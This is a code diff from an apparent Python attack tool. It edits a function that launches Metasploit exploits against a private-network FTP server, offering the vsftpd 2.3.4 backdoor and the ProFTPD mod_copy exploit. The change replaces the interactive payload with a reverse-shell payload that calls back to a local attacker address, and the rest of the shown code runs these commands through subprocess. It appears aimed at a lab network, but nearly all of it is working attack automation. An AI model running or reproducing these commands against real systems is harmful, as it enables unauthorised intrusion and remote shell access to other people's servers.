@@ -80,37 +80,31 @@ def perform_dos(ip_addr=None):
 # (6) Code to perform ftp attack
 def perform_ftp_attack():
     ip_addr = "192.168.200.55"
+    local_ip = "192.168.200.45"
 
     print("(1) Exploit the vsftpd 2.3.4 backdoor vulnerability")
-    print("(2) Exploit the ProFTPD 1.3.3c mod_copy command execution vulnerability")
-    print("(3) Exploit the ProFTPD 1.3.3c backdoor command execution vulnerability")
+    print("(2) Exploit the ProFTPD 1.3.1 mod_copy command execution vulnerability")
 
     # Get input from the user
     choice = input("Enter the number of the attack to perform: ")
 
     if choice == "1":
-        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
+        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/reverse; set LHOST {local_ip}; run'"
         return exploit_ftp(metasploit_command)
     elif choice == "2":
-        metasploit_command = (
-            metasploit_command
-        ) = f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
-        return exploit_ftp(metasploit_command)
-    elif choice == "3":
-        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
+        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/reverse; set LHOST {local_ip}; run'"
         return exploit_ftp(metasploit_command)
     else:
         print("Invalid choice\n")
         return perform_ftp_attack()
 
 
-# The metasploit_command contains the malicious commands to exploit the backdoor.
 def exploit_ftp(metasploit_command):
     try:
         # Execute the Metasploit command using subprocess
-        subprocess.run(metasploit_command, shell=True)
+        subprocess.run(metasploit_command, shell=True, check=True)
         return "Exploit executed successfully."
-    except Exception as e:
+    except subprocess.CalledProcessError as e:
         return f"An error occurred: {str(e)}"
 
 
